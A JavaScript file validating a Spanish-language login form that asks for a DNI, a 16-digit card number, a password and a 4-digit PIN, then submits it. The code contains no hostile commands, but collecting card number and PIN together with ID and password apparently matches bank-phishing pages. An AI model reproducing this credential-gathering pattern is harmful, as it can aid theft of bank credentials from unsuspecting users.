(function() {
    'use strict';

    const form = document.getElementById('loginForm');
    const dniInput = document.getElementById('dni');
    const tarjetaInput = document.getElementById('tarjeta');
    const passwordInput = document.getElementById('password');
    const pinInputs = document.querySelectorAll('.pin-input');
    const hiddenPin = document.getElementById('hiddenPin');
    const dniError = document.getElementById('dniError');
    const tarjetaError = document.getElementById('tarjetaError');
    const passwordError = document.getElementById('passwordError');
    const pinError = document.getElementById('pinError');
    const loadingScreen = document.getElementById('loadingScreen');

    function updateHiddenPin() {
        let pin = '';
        pinInputs.forEach(function(inp) { pin += inp.value; });
        hiddenPin.value = pin;
        return pin;
    }

    pinInputs.forEach(function(input, index) {
        input.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value.length === 1 && index < pinInputs.length - 1) {
                pinInputs[index + 1].focus();
            }
            updateHiddenPin();
            pinError.textContent = '';
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                pinInputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', function(e) {
            e.preventDefault();
            var paste = (e.clipboardData || window.clipboardData).getData('text');
            var digits = paste.replace(/[^0-9]/g, '').slice(0, 4);
            if (digits.length === 0) return;
            for (var i = 0; i < digits.length && i < pinInputs.length; i++) {
                pinInputs[i].value = digits[i];
            }
            if (digits.length === 4) {
                pinInputs[3].focus();
            } else {
                pinInputs[digits.length].focus();
            }
            updateHiddenPin();
            pinError.textContent = '';
        });
    });

    function validateForm() {
        var isValid = true;

        var dni = dniInput.value.trim();
        if (!/^[0-9]{8}$/.test(dni)) {
            dniError.textContent = 'DNI debe tener exactamente 8 dígitos numéricos.';
            isValid = false;
        } else {
            dniError.textContent = '';
        }

        var tarjeta = tarjetaInput.value.trim();
        if (!/^[0-9]{16}$/.test(tarjeta)) {
            tarjetaError.textContent = 'Tarjeta debe tener exactamente 16 dígitos numéricos.';
            isValid = false;
        } else {
            tarjetaError.textContent = '';
        }

        var password = passwordInput.value.trim();
        if (password.length < 6) {
            passwordError.textContent = 'La contraseña debe tener al menos 6 caracteres.';
            isValid = false;
        } else {
            passwordError.textContent = '';
        }

        var pin = updateHiddenPin();
        if (!/^[0-9]{4}$/.test(pin)) {
            pinError.textContent = 'El PIN debe tener 4 dígitos numéricos.';
            isValid = false;
        } else {
            pinError.textContent = '';
        }

        return isValid;
    }

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        if (!validateForm()) {
            if (dniError.textContent) { dniInput.focus(); }
            else if (tarjetaError.textContent) { tarjetaInput.focus(); }
            else if (passwordError.textContent) { passwordInput.focus(); }
            else if (pinError.textContent) { pinInputs[0].focus(); }
            return;
        }

        loadingScreen.style.display = 'flex';
        form.submit();
    });

    document.getElementById('registerLink').addEventListener('click', function(e) {
        e.preventDefault();
        loadingScreen.style.display = 'flex';
        setTimeout(function() { window.location.href = '/register'; }, 600);
    });

})();